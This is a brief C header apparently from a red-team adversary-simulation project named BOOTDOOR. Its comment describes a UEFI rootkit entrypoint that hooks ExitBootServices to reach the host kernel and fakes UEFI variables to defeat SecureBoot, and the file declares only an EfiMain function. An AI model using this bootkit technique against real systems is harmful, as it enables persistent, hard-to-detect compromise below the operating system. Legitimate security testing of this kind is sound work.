/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * BOOTDOOR rootkit entrypoint. Installs a hook on
 * ExitBootServices to transition to the kernel of
 * the host.
 *
 * Intended to also support SecureBoot hosts by
 * faking UEFI variables.
 *
!*/

D_SEC( A ) EFI_STATUS EFIAPI EfiMain( EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE * SystemTable );
